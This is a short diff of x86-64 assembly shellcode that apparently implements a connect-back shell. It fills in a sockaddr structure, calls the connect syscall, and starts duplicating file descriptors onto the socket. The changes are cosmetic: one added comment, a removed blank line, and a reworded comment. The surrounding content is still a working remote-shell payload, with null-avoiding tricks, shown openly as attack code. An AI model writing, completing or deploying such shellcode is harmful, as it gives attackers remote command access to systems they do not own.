@@ -8,6 +8,7 @@ sh:
 eol:
     .byte 0xff
 sockaddr:
+    #AF_INET
 	.byte 2
 	.byte 0xff
 	.word 4391
@@ -40,7 +41,6 @@ next:
 	# sys_connect
 	xorl %eax, %eax
 	movb $42, %al
-
 	leaq sockaddr(%rip), %rsi
 	xorl %edx, %edx
     # put zeroes in sockaddr
@@ -53,7 +53,7 @@ next:
 	movb $16, %dl
 
 	syscall
-	# at this point rax can be -111 (connection refused)
+	# at this point rax could be -111 (connection refused)
 
 	# dupd2(fd, 0)
 	xorl %esi, %esi
